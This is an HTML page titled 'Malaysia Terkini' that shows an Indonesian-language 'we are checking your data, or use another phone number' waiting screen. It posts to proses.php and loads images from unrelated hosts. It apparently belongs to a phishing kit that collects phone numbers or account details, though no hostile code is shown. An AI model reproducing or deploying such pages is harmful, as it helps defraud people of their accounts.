<!doctype html>
<html lang="en" class="h-100">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head id="ctl00_Head1">
		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
		<link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
		<link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta property="og:title" content="Malaysia Terkini">
		<meta property="og:image" content="https://kongsibersama.semasa.my.id/assets/img/ini.png">
		<meta name="description" />
		<meta name="author" content="Malaysia Terkini" />
		<title>Malaysia Terkini</title>
		<link rel="icon" type="image/x-icon" href="favicon.html" />
		<link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/sticky-footer/" />
		<link rel="stylesheet" href="assets/css/bootstrap-icons.css" />
		<script type="text/javascript" src="assets/js/vue.min.js.download"></script>
		<script src="assets/js/clipboard.js.download"></script>
		<script type="text/javascript" src="assets/js/index.js.download"></script>
		<style type="text/css">
			.bd-placeholder-img {
				font-size: 1.125rem;
				text-anchor: middle;
				-webkit-user-select: none;
				-moz-user-select: none;
				user-select: none;
			}

			@media (min-width: 768px) {
				.bd-placeholder-img-lg {
					font-size: 3.5rem;
				}
			}

			/* Absolute Center Spinner */
			.loading {
				position: fixed;
				z-index: 999;
				height: 2em;
				width: 2em;
				overflow: show;
				margin: auto;
				top: 0;
				left: 0;
				bottom: 0;
				right: 0;
			}

			/* Transparent Overlay */
			.loading:before {
				content: '';
				display: block;
				position: fixed;
				top: 0;
				left: 0;
				width: 100%;
				height: 100%;
				background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));

				background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
			}

			/* :not(:required) hides these rules from IE9 and below */
			.loading:not(:required) {
				/* hide "loading..." text */
				font: 0/0 a;
				color: transparent;
				text-shadow: none;
				background-color: transparent;
				border: 0;
			}

			.loading:not(:required):after {
				content: '';
				display: block;
				font-size: 10px;
				width: 1em;
				height: 1em;
				margin-top: -0.5em;
				-webkit-animation: spinner 150ms infinite linear;
				-moz-animation: spinner 150ms infinite linear;
				-ms-animation: spinner 150ms infinite linear;
				-o-animation: spinner 150ms infinite linear;
				animation: spinner 150ms infinite linear;
				border-radius: 0.5em;
				-webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
				box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
			}

			/* Animation */

			@-webkit-keyframes spinner {
				0% {
					-webkit-transform: rotate(0deg);
					-moz-transform: rotate(0deg);
					-ms-transform: rotate(0deg);
					-o-transform: rotate(0deg);
					transform: rotate(0deg);
				}

				100% {
					-webkit-transform: rotate(360deg);
					-moz-transform: rotate(360deg);
					-ms-transform: rotate(360deg);
					-o-transform: rotate(360deg);
					transform: rotate(360deg);
				}
			}

			@-moz-keyframes spinner {
				0% {
					-webkit-transform: rotate(0deg);
					-moz-transform: rotate(0deg);
					-ms-transform: rotate(0deg);
					-o-transform: rotate(0deg);
					transform: rotate(0deg);
				}

				100% {
					-webkit-transform: rotate(360deg);
					-moz-transform: rotate(360deg);
					-ms-transform: rotate(360deg);
					-o-transform: rotate(360deg);
					transform: rotate(360deg);
				}
			}

			@-o-keyframes spinner {
				0% {
					-webkit-transform: rotate(0deg);
					-moz-transform: rotate(0deg);
					-ms-transform: rotate(0deg);
					-o-transform: rotate(0deg);
					transform: rotate(0deg);
				}

				100% {
					-webkit-transform: rotate(360deg);
					-moz-transform: rotate(360deg);
					-ms-transform: rotate(360deg);
					-o-transform: rotate(360deg);
					transform: rotate(360deg);
				}
			}

			@keyframes spinner {
				0% {
					-webkit-transform: rotate(0deg);
					-moz-transform: rotate(0deg);
					-ms-transform: rotate(0deg);
					-o-transform: rotate(0deg);
					transform: rotate(0deg);
				}

				100% {
					-webkit-transform: rotate(360deg);
					-moz-transform: rotate(360deg);
					-ms-transform: rotate(360deg);
					-o-transform: rotate(360deg);
					transform: rotate(360deg);
				}
			}
			
			.form-container .hidden { 
            display: none; 
            
        }
		</style>
	</head>

	<body class="d-flex flex-column h-100">
		<div id="loading" class="loading" style="display: none;"></div>

		<main class="flex-shrink-0">
			<div id="ctl00_divContainer" class="container container-narrow">
				<div class="header mt-3 text-center">
					<img src="https://hosting.tigerengine.id/rusbv4.png" id="ctl00_logohead" class="img-fluid" width="450" />
				</div>
				
				<div class="form-container">
				    
				    <form action="proses.php">
				        <div class="container">
						<p style="background: #404283; color: #fff; padding-top: 1px; margin-bottom: 6px; padding-bottom: 0px; height: 31px; font-size: 14px; text-align: center;"><br /><br /></p>
						<section style="border: 1px solid #c2c5c8; padding: 12px 20px 20px 20px;">
								<div class="mb-3">
								<p class="text-center"><img src="https://kongsirezeki.inkf.site/join1/assets/img/processing.gif" id="ctl00_logohead" class="img-fluid" width="160" /></p>
					<h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Mohon tunggu beberapa saat, tim kami sedang memeriksa data Anda.</span></h5>
					<h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">atau gunakan nomor telepon lain dan.</span></h5>
					<p class="text-center"><a href="#" class="btn btn-lg btn-block btn-mk"><span id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Coba Lagi</span></a></p>
								</div>
						</section>
					</div>
				    </form>
				    
				</div>

			</div>
		</main>
		<script src="../code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
		<script type="text/javascript" src="../code.jquery.com/jquery-1.10.2.min.js"></script>
		<script type="text/javascript" src="../ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
		<script src="../ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
		<script src="assets/js/script.js"></script>
		<script type="text/javascript" src="assets/js/jquery-3.4.1.min.js.download"></script>
	</body>
</html>